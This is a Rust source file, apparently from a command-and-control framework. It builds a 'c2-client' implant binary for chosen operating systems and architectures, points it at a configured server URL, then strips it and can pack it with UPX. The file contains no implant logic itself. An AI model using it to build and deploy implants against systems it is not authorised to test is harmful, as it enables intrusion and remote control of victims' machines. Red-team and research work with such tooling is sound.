use std::process::Command;
use std::fs;
use std::path::Path;
use thiserror::Error;

#[derive(Error, Debug)]
pub enum PayloadError {
    #[error("Cargo build failed")]
    BuildError,
    #[error("IO error: {0}")]
    IoError(#[from] std::io::Error),
    #[error("Invalid target specification")]
    InvalidTarget,
}

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum TargetOs {
    Windows,
    Linux,
    MacOS,
}

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum Architecture {
    X86_64,
    Aarch64,
}

#[derive(Debug, Clone)]
pub struct PayloadConfig {
    pub server_url: String,
    pub target_os: TargetOs,
    pub architecture: Architecture,
    pub output_path: String,
    pub strip: bool,
    pub upx: bool,
}

impl Default for PayloadConfig {
    fn default() -> Self {
        Self {
            server_url: "127.0.0.1:8080".to_string(),
            target_os: TargetOs::Linux,
            architecture: Architecture::X86_64,
            output_path: "./payload".to_string(),
            strip: true,
            upx: false,
        }
    }
}

pub fn generate_payload(config: &PayloadConfig) -> Result<(), PayloadError> {
    // Create output directory if it doesn't exist
    let output_dir = Path::new(&config.output_path).parent().unwrap_or(Path::new("."));
    fs::create_dir_all(output_dir)?;
    
    // Build the target-specific payload
    let target = format!("{}-{}", 
        match config.architecture {
            Architecture::X86_64 => "x86_64",
            Architecture::Aarch64 => "aarch64",
        },
        match config.target_os {
            TargetOs::Windows => "pc-windows-msvc",
            TargetOs::Linux => "unknown-linux-gnu",
            TargetOs::MacOS => "apple-darwin",
        }
    );
    
    // Build the client with cargo
    let status = Command::new("cargo")
        .args(["build", "-p", "c2-client", "--release", "--target", &target])
        .status()?;
    
    if !status.success() {
        return Err(PayloadError::BuildError);
    }
    
    let source_binary = format!("target/{}/release/c2-client{}", 
        target,
        if config.target_os == TargetOs::Windows { ".exe" } else { "" }
    );
    
    // Copy to output path
    fs::copy(&source_binary, &config.output_path)?;
    
    // Optional: strip binary
    if config.strip && config.target_os != TargetOs::Windows {
        let _ = Command::new("strip")
            .arg(&config.output_path)
            .status();
    }
    
    // Optional: compress with UPX
    if config.upx {
        let _ = Command::new("upx")
            .args(["--best", "--lzma", &config.output_path])
            .status();
    }
    
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_target_formatting() {
        let config = PayloadConfig {
            target_os: TargetOs::Linux,
            architecture: Architecture::X86_64,
            ..Default::default()
        };
        
        let target = format!("{}-{}", 
            match config.architecture {
                Architecture::X86_64 => "x86_64",
                Architecture::Aarch64 => "aarch64",
            },
            match config.target_os {
                TargetOs::Windows => "pc-windows-msvc",
                TargetOs::Linux => "unknown-linux-gnu",
                TargetOs::MacOS => "apple-darwin",
            }
        );
        
        assert_eq!(target, "x86_64-unknown-linux-gnu");
    }
}